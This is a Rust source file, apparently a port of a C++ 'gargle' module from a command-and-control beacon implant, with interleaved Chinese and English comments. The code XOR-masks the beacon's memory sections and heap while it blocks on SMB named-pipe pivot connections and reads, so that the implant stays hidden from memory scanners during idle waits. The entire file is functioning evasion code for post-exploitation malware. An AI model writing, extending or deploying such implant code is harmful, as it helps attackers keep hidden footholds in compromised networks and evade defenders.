//! gargle_pivot_smb.cpp 的移植版 — 围绕命名管道等待的睡眠掩码，
//! Port of gargle_pivot_smb.cpp — sleep-masking around named-pipe waits for
//! 用于 SMB pivot 通道。
//! SMB pivot channels.
//!
//! `GargleBlockPipe` 阻塞（信标处于掩码状态）直到客户端向管道写入数据；
//! `GargleBlockPipe` blocks (with the beacon masked) until a client has
//! `GarglePipeWait` 阻塞（掩码）直到客户端连接到管道。两者只在
//! written data to the pipe; `GarglePipeWait` blocks (masked) until a client
//! 设置了 `SETTING_GARGLE_NOOK` 且没有工作线程运行时才掩码；
//! connects to the pipe. Both only mask when `SETTING_GARGLE_NOOK` is set and
//! 否则退化为普通的等待 / “未连接”行为，与 C++ 完全一致。
//! no worker threads are running; otherwise they degrade to the plain wait /
//! "not connected" behaviour, exactly like the C++.
//!
//! C++ 在掩码状态下执行复制的 asm trampoline；Rust 移植版
//! The C++ executed a copied asm trampoline while masked; the Rust port
//! 对相同内存范围应用相同的 XOR 掩码，并在
//! applies the same XOR mask to the same memory ranges and blocks in a
//! `PeekNamedPipe`/`ConnectNamedPipe` 循环中阻塞，每次睡眠 100 ms
//! `PeekNamedPipe`/`ConnectNamedPipe` loop with 100 ms sleeps (see
//! （参见 `crate::gargleint::mask_sections_and_heap`）。
//! `crate::gargleint::mask_sections_and_heap`).

use crate::beacon::SETTING_GARGLE_NOOK;
use crate::gargleint::{gargle_trampoline, GargleP};
use crate::settings::setting_int;
use crate::state::THREAD_COUNT;
use std::ffi::c_void;
use std::sync::atomic::Ordering;
use std::time::Duration;
use windows_sys::Win32::Foundation::{GetLastError, HANDLE, ERROR_BROKEN_PIPE, ERROR_PIPE_CONNECTED};
use windows_sys::Win32::Storage::FileSystem::ReadFile;
use windows_sys::Win32::System::IO::OVERLAPPED;
use windows_sys::Win32::System::Pipes::{ConnectNamedPipe, PeekNamedPipe};
use windows_sys::Win32::System::Threading::Sleep;

/// `GARGLE_ACTION_PIPE_WAIT` — 等待客户端连接。
/// `GARGLE_ACTION_PIPE_WAIT` — wait for a client to connect.
pub const GARGLE_ACTION_PIPE_WAIT: i32 = 0;
/// `GARGLE_ACTION_PIPE_PEEK` — 等待数据可用。
/// `GARGLE_ACTION_PIPE_PEEK` — wait until data is available.
pub const GARGLE_ACTION_PIPE_PEEK: i32 = 1;

type ConnectNamedPipeProc = unsafe extern "system" fn(HANDLE, *mut OVERLAPPED) -> i32;
type GetLastErrorProc = unsafe extern "system" fn() -> u32;
type PeekNamedPipeProc = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    u32,
    *mut u32,
    *mut u32,
    *mut u32,
) -> i32;
type SleepProc = unsafe extern "system" fn(u32);

/// `GARGLE_PIPE_ARGS` — 传递给管道掩码例程的参数。
/// `GARGLE_PIPE_ARGS` — arguments passed to the pipe mask routine.
#[repr(C)]
pub struct GarglePipeArgs {
    /// 要执行的操作：[`GARGLE_ACTION_PIPE_WAIT`] 或 [`GARGLE_ACTION_PIPE_PEEK`]。
    /// What to do: [`GARGLE_ACTION_PIPE_WAIT`] or [`GARGLE_ACTION_PIPE_PEEK`].
    pub action: i32,
    /// 命名管道句柄。
    /// The named pipe handle.
    pub pipe: HANDLE,
    pub connect_named_pipe: ConnectNamedPipeProc,
    pub get_last_error: GetLastErrorProc,
    pub peek_named_pipe: PeekNamedPipeProc,
    pub sleep: SleepProc,
}

/// 管道变体的 `GARGLEF`。
/// `GARGLEF` for the pipe variant.
type GargleF = fn(&GargleP, &GarglePipeArgs);

/// `_gargle_it` — 掩码管道等待。
/// `_gargle_it` — masked pipe wait.
///
/// 掩码信标数据，阻塞直到请求的管道条件满足，然后取消掩码。
/// Masks the beacon data, blocks until the requested pipe condition is met,
/// `args` 中的函数指针镜像 C++ 结构；等待本身直接调用 Win32 API
/// then unmasks. The function pointers in `args` mirror the C++ struct; the
/// （语义相同）。
/// wait itself calls the Win32 API directly (identical semantics).
fn gargle_it(parms: &GargleP, args: &GarglePipeArgs) {
    crate::gargleint::mask_sections_and_heap(parms);

    match args.action {
        GARGLE_ACTION_PIPE_WAIT => {
            /* 等待客户端连接到我们的管道 */
            /* wait for a client to connect to our pipe */
            loop {
                let connected = unsafe { ConnectNamedPipe(args.pipe, std::ptr::null_mut()) };
                if connected != 0 {
                    break;
                }
                let err = unsafe { GetLastError() };
                /* 客户端在 CreateNamedPipe 和我们调用之间已连接 */
                /* the client connected between CreateNamedPipe and our call */
                if err == ERROR_PIPE_CONNECTED {
                    break;
                }
                std::thread::sleep(Duration::from_millis(100));
            }
        }
        _ => {
            /* GARGLE_ACTION_PIPE_PEEK：等待数据可用 */
            /* GARGLE_ACTION_PIPE_PEEK: wait until data is available */
            loop {
                let mut available: u32 = 0;
                let ok = unsafe {
                    PeekNamedPipe(
                        args.pipe,
                        std::ptr::null_mut(),
                        0,
                        std::ptr::null_mut(),
                        &mut available,
                        std::ptr::null_mut(),
                    )
                };
                if ok != 0 && available > 0 {
                    break;
                }
                if ok == 0 {
                    let err = unsafe { GetLastError() };
                    /* 客户端已断开；不会有更多数据到达 */
                    /* the client disconnected; nothing more will arrive */
                    if err == ERROR_BROKEN_PIPE {
                        break;
                    }
                }
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }

    crate::gargleint::unmask_sections_and_heap(parms);
}

/// `setup_trampoline2` — 一次性 trampoline/参数设置。
/// `setup_trampoline2` — one-time trampoline/parameter setup.
fn setup_trampoline2() {
    gargle_trampoline(
        (setup_trampoline2 as fn()) as usize as *mut u8,
        (gargle_it as GargleF) as usize as *mut u8,
    );
}

/// `GargleBlockPipe` — 在信标被掩码的情况下阻塞，直到管道有数据。
/// `GargleBlockPipe` — block, with the beacon masked, until the pipe has data.
///
/// 当禁用 gargle 或有工作线程运行时不做任何事。
/// Does nothing when gargle is disabled or worker threads are running.
pub fn gargle_block_pipe(pipe: isize) {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        /* 不做任何事 */
        /* do nothing */
        return;
    }

    /* 创建我们的 trampoline */
    /* create our trampoline, please */
    setup_trampoline2();

    /* 设置我们的参数 */
    /* setup our arguments */
    let args = GarglePipeArgs {
        action: GARGLE_ACTION_PIPE_PEEK,
        pipe: pipe as HANDLE,
        connect_named_pipe: ConnectNamedPipe,
        get_last_error: GetLastError,
        peek_named_pipe: PeekNamedPipe,
        sleep: Sleep,
    };

    /* 获取要掩码的堆段。 */
    /* get the heap sections to mask. */
    crate::gargleint::refresh_heap_records();

    /* 调用我们的函数 */
    /* call our function */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, &args);
}

/// `GarglePipeWait` — 在信标被掩码的情况下阻塞，直到客户端连接到
/// `GarglePipeWait` — block, with the beacon masked, until a client connects
/// 管道。连接成功后返回 `true`（C++ 在掩码等待完成后总是返回 `TRUE`）；
/// to the pipe. Returns `true` once connected (the C++ always returns `TRUE`
/// 当禁用 gargle 或有工作线程运行时返回 `false`，镜像 C++ 的 `FALSE` 回退。
/// after the masked wait completes); returns `false` when gargle is disabled
/// or worker threads are running, mirroring the C++ `FALSE` fall-through.
pub fn gargle_pipe_wait(pipe: isize) -> bool {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        return false;
    }

    /* 创建我们的 trampoline */
    /* create our trampoline, please */
    setup_trampoline2();

    /* 设置我们的参数 */
    /* setup our arguments */
    let args = GarglePipeArgs {
        action: GARGLE_ACTION_PIPE_WAIT,
        pipe: pipe as HANDLE,
        connect_named_pipe: ConnectNamedPipe,
        get_last_error: GetLastError,
        peek_named_pipe: PeekNamedPipe,
        sleep: Sleep,
    };

    /* 获取要掩码的堆段。 */
    /* get the heap sections to mask. */
    crate::gargleint::refresh_heap_records();

    /* 调用我们的函数 */
    /* call our function */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, &args);

    /* 返回我们结构体中的输出值 */
    /* return the out value from our struct */
    true
}

/// 等待客户端连接到命名管道（`gargle_wait_smb` 的非 gargle 路径使用的
/// Wait for a client to connect to the named pipe (unmasked helper used by the
/// 非掩码辅助函数）。
/// non-gargle path of [`gargle_wait_smb`]).
fn wait_pipe_connected(pipe: HANDLE) -> bool {
    loop {
        let connected = unsafe { ConnectNamedPipe(pipe, std::ptr::null_mut()) };
        if connected != 0 {
            return true;
        }
        let err = unsafe { GetLastError() };
        if err == ERROR_PIPE_CONNECTED {
            return true;
        }
        std::thread::sleep(Duration::from_millis(100));
    }
}

/// 从管道中读取最多 `max` 字节到 `read`；返回读取的字节数，
/// Read up to `max` bytes from the pipe into `read`; returns the number of
/// 失败时返回 -1。
/// bytes read, or -1 on failure.
fn read_pipe(pipe: HANDLE, read: *mut u8, max: usize) -> i32 {
    if read.is_null() || max == 0 {
        return 0;
    }
    let mut nread: u32 = 0;
    let ok = unsafe { ReadFile(pipe, read, max as u32, &mut nread, std::ptr::null_mut()) };
    if ok == 0 {
        return -1;
    }
    nread as i32
}

/// SMB 等待的掩码变体：阻塞（掩码）直到客户端连接，
/// Masked variant of the SMB wait: block (masked) until a client connects,
/// 然后读取最多 `max` 字节到 `read`。返回读取的字节数，
/// then read up to `max` bytes into `read`. Returns the number of bytes read,
/// 读取失败返回 -1。禁用 gargle 时退化为不带掩码的普通等待 + 读取。
/// or -1 if the read failed. When gargle is disabled this degrades to the
/// plain wait + read with no masking.
pub fn gargle_wait_smb(handle: isize, read: *mut u8, max: usize) -> i32 {
    let pipe = handle as HANDLE;

    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        wait_pipe_connected(pipe);
        return read_pipe(pipe, read, max);
    }

    setup_trampoline2();
    crate::gargleint::refresh_heap_records();

    let parms = crate::gargleint::gparms();
    crate::gargleint::mask_sections_and_heap(&parms);

    wait_pipe_connected(pipe);
    let nread = read_pipe(pipe, read, max);

    crate::gargleint::unmask_sections_and_heap(&parms);
    nread
}

/// SMB accept 的掩码变体：阻塞（掩码）直到客户端连接到
/// Masked variant of the SMB accept: block (masked) until a client connects
/// 管道并返回已连接的管道句柄（命名管道复用服务器句柄，
/// to the pipe and return the connected pipe handle (named pipes reuse the
/// 因此返回输入句柄）。禁用 gargle 时不等待直接返回句柄，
/// server handle, so the input handle is returned). When gargle is disabled
/// 镜像 C++ 的 `GarglePipeWait` 回退。
/// the handle is returned without waiting, mirroring the C++ `GarglePipeWait`
/// fall-through.
pub fn gargle_accept_smb(handle: isize) -> isize {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        return handle;
    }

    setup_trampoline2();
    crate::gargleint::refresh_heap_records();

    let parms = crate::gargleint::gparms();
    crate::gargleint::mask_sections_and_heap(&parms);

    wait_pipe_connected(handle as HANDLE);

    crate::gargleint::unmask_sections_and_heap(&parms);
    handle
}
